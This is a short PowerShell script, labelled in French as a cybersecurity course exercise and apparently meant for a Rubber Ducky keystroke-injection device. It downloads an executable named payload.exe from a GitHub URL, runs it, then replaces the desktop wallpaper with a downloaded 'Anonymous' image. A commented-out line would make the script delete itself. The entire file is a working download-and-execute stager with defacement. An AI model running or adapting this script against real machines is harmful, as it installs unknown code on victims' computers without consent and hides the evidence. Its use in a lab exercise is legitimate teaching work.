# Script PowerShell - TP Cybersécurité
# Télécharge et exécute le payload, puis change le fond d'écran

# Téléchargement du payload .exe
$payloadPath = "C:\Users\Public\payload.exe"
Write-Host "Téléchargement du payload..." -ForegroundColor Yellow
Invoke-WebRequest -Uri 'https://github.com/L4Curtis/rubberduckyTP/raw/main/payload.exe' -OutFile $payloadPath

# Exécution du payload
Write-Host "Exécution du payload..." -ForegroundColor Yellow
Start-Process $payloadPath

# Téléchargement de l'image Anonymous
$imagePath = "$env:TEMP\anonymous.jpg"
Write-Host "Téléchargement de l'image..." -ForegroundColor Yellow
Invoke-WebRequest -Uri 'https://github.com/L4Curtis/rubberduckyTP/raw/main/5448.jpg' -OutFile $imagePath

# Changement du fond d'écran
Write-Host "Changement du fond d'écran..." -ForegroundColor Yellow

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@

# Appliquer le nouveau fond d'écran
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 3)

Write-Host "Opération terminée !" -ForegroundColor Green

# Auto-destruction du script (optionnel)
# Remove-Item $MyInvocation.MyCommand.Path -Force
